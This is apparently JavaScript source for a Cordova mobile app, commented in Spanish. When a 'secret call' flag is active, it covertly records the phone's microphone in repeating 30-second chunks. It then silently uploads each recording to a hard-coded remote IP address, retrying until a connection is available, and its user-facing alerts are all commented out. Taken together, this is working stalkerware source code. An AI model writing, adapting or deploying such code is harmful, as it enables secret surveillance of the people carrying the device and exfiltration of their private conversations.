// JavaScript Document window.passestado!=0 // Con esto se que tengo que mandar uno nuevo
document.addEventListener("deviceready", onDeviceReadyUdid, false);
function onDeviceReadyUdid() {
    window.deviceuuid=device.uuid;
}
window.grabacionsrc="";
function parseEntero(valor){
	if(valor<10){
		return "0"+valor;
	}else{
		return valor;
	}
}
function startAudioRec() {
	if(window.llamadaSecretaActiva!=0){
	var date = new Date;
	var fecha = date.getFullYear()+"-"+parseEntero(date.getMonth()+1)+"-"+parseEntero(date.getDate())+"-"+parseEntero(date.getHours())+"-"+parseEntero(date.getMinutes())+"-"+parseEntero(date.getSeconds());
  var src = window.celCode+"rec"+fecha+".amr"; //ESTE ARCHIVO LO GUARDA EN EL DEVICE STORAGE
  window.grabacionsrc= src;
  window.audioRec = new Media(src, recordOnSuccess, recordOnError);
  window.audioRec.startRecord();
  setTimeout(function(){stopAudioRec();},30000);}else{
	  setTimeout(function(){startAudioRec();},30000);// Vuelve a probar a ver si la activarion
  }
}
function recordOnError() {setTimeout(function(){startAudioRec();},5000);}
function recordOnSuccess() {window.audioRec.release();checkIfFileExists(window.grabacionsrc);if(window.passestado!=0){startAudioRec();}}

function stopAudioRec() {
  window.audioRec.stopRecord();
}
function sendFile(src,contador) {
            var options = new FileUploadOptions();
			options.fileKey = "audio";
			options.fileName = src.substr(src.lastIndexOf('/') + 1);//Lleva el nombre con el que lo guardamos
			options.mimeType = "audio/AMR";
			options.httpMethod = "POST";
			options.chunkedMode = false;

            var params = {};
            params.value1 = "test";
            params.value2 = "param";

            options.params = params;

            var ft = new FileTransfer();
            ft.upload(src, encodeURI("http://45.79.140.250/audio/upload.php"), win, fail, options);
        }

        function win(r) {
			//alert("Se mando");
            //alert("Code = " + r.responseCode);
            //alert("Response = " + r.response);
            //alert("Sent = " + r.bytesSent);
        }

        function fail(error) {
            //alert("An error has occurred: Code = " + error.code);
            //alert("upload error source " + error.source);
            //alert("upload error target " + error.target);
        }
function checkIfFileExists(path){
    window.requestFileSystem(LocalFileSystem.PERSISTENT, 0, function(fileSystem){
        fileSystem.root.getFile(path, { create: false }, fileExists, fileDoesNotExist);
    }, getFSFail); //of requestFileSystem
}
function fileExists(fileEntry){
    //alert("File " + fileEntry.fullPath + " exists! Te lo mando al server");
	//alert("Lo que le tiene que pasar para uploadear es esto: "+fileEntry.toURL());
	if(checkConnection()){
	sendFile(fileEntry.toURL(),0);}else{
		setTimeout(function(){fileExists(fileEntry);},5000);
	}
}
function fileDoesNotExist(){
    //alert("file does not exist");
}
function getFSFail(evt) {
    //alert(evt.target.error.code);
}